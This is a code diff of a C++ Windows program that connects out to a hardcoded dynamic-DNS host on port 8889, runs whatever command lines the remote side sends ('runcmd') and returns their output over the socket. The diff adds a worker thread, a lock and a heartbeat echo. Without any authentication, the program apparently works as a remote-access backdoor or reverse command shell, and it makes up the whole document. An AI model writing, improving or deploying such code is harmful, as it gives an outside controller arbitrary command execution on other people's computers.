@@ -138,11 +138,16 @@ VOID ExecCmdLine( LPCWSTR pszCmdLine ,TypeMsgOutputCallBack pCallback,PVOID pPar
 	}
 }
 
-
+typedef struct tagOUTPUT_PARAM
+{
+	CTcpSocket *ptcpSock;
+	HANDLE     hSource;
+}OUTPUT_PARAM,*POUTPUT_PARAM;
 VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 {
+	POUTPUT_PARAM pOutputParam = (POUTPUT_PARAM)pParam;
 
-	CTcpSocket *ptcpSock = (CTcpSocket *)pParam;
+	CTcpSocket *ptcpSock = pOutputParam->ptcpSock;
 	if (ptcpSock)
 	{
 		CString strMsgOutput;
@@ -162,7 +167,7 @@ VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 			strMsgOutput.Delete(0,128);
 
 			IniResponse.WriteIniString( L"",L"result",strTempMsgOutput);
-
+			IniResponse.WriteIniInt(L"",L"target",(int)pOutputParam->hSource);
 			CString strResponseData;
 			strResponseData = IniResponse.BuildData();
 
@@ -172,6 +177,79 @@ VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 		}
 	}
 
+}
+
+
+
+class CCSLock
+{
+private:
+	CRITICAL_SECTION m_cs;
+public:
+	CCSLock()
+	{
+		InitializeCriticalSection(&m_cs);
+	}
+	~CCSLock()
+	{
+		DeleteCriticalSection(&m_cs);
+	}
+	VOID Lock()
+	{
+		EnterCriticalSection(&m_cs);
+	}
+
+	VOID UnLock()
+	{
+		LeaveCriticalSection(&m_cs);
+	}
+
+};
+
+typedef struct tagRUN_CMD_PARAM
+{
+	CString strCmdData;
+	CTcpSocket *ptcpSock;
+	HANDLE hSource;
+}RUN_CMD_PARAM,*PRUN_CMD_PARAM;
+
+CCSLock csLock;
+BOOL  bRunningCmd = FALSE;
+
+DWORD WINAPI RunCmdThread( PVOID pParam )
+{
+	PRUN_CMD_PARAM pRunCmdParam = (PRUN_CMD_PARAM)pParam;
+
+	csLock.Lock();
+	bRunningCmd = TRUE;
+	csLock.UnLock();
+
+
+	OUTPUT_PARAM OutputParam;
+	OutputParam.ptcpSock = pRunCmdParam->ptcpSock;
+	OutputParam.hSource = pRunCmdParam->hSource;
+
+	ExecCmdLine(pRunCmdParam->strCmdData,MsgOutputCallBack,&OutputParam);
+
+	CMemIniFile IniResponse;
+	IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
+	IniResponse.WriteIniString( L"",L"result",L"命令执行完成\r\n");
+	IniResponse.WriteIniInt( L"",L"target",(int)pRunCmdParam->hSource);
+
+	CString strResponseData;
+	strResponseData = IniResponse.BuildData();
+
+	OutputDebugStringW(strResponseData+L"\r\n");
+
+	int nSendRes = pRunCmdParam->ptcpSock->SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );
+
+	delete pRunCmdParam;
+
+	csLock.Lock();
+	bRunningCmd = FALSE;
+	csLock.UnLock();
+	
+	return 0;
 }
 
 int APIENTRY _tWinMain(HINSTANCE hInstance,
@@ -184,42 +262,51 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 	BOOL bConRes = tcpSock.Connect( "gz8912.jios.org",8889 );
 	if (bConRes)
 	{
-		
+
 		char chRecvDataBuffer[4096];
 		while (TRUE)
 		{
-			int nRecvRes = tcpSock.RecvData(chRecvDataBuffer,4095);
+			int nRecvRes = tcpSock.RecvData(chRecvDataBuffer,4094);
 			if (nRecvRes <= 0 )
 			{
 				break;
 			}
 
+			chRecvDataBuffer[nRecvRes] = 0;
+			chRecvDataBuffer[nRecvRes+1] = 0;
+
 			CMemIniFile Ini;
 			Ini.ParseMemoryDataW((BYTE *)chRecvDataBuffer,nRecvRes);
+			
+			HANDLE hSource = (HANDLE)Ini.GetIniUint(L"",L"source",0);
 
 			CString strCmd;
 			strCmd = Ini.GetIniString(L"",L"cmd",L"");
 			if (strCmd == L"runcmd")
 			{
-				CString strCmdData;
-				strCmdData = Ini.GetIniString(L"",L"data",L"");
+				BOOL bCanRunCmd = FALSE;
+				csLock.Lock();
+				bCanRunCmd = !bRunningCmd;
+				csLock.UnLock();
+				
+				if (bCanRunCmd)
+				{
+					CString strCmdData;
+					strCmdData = Ini.GetIniString(L"",L"data",L"");
 
-				ExecCmdLine(strCmdData,MsgOutputCallBack,&tcpSock);
+					PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
+					pRunCmdParam->hSource = hSource;
+					pRunCmdParam->strCmdData = strCmdData;
+					pRunCmdParam->ptcpSock = &tcpSock;
+
+					HANDLE hRunCmdThread = CreateThread(NULL,0,RunCmdThread,pRunCmdParam,0,NULL);
+				}
 			}
 
-			CMemIniFile IniResponse;
-			IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
-
-			IniResponse.WriteIniString( L"",L"result",L"命令执行完成\r\n");
-
-			CString strResponseData;
-			strResponseData = IniResponse.BuildData();
-
-			OutputDebugStringW(strResponseData+L"\r\n");
-
-			int nSendRes = tcpSock.SendData( (BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR) );
-
-
+			if (strCmd == L"heartbeat")
+			{
+				int nSendRes = tcpSock.SendData( (BYTE *)chRecvDataBuffer,nRecvRes );
+			}
 			Sleep(1);
 		}
 
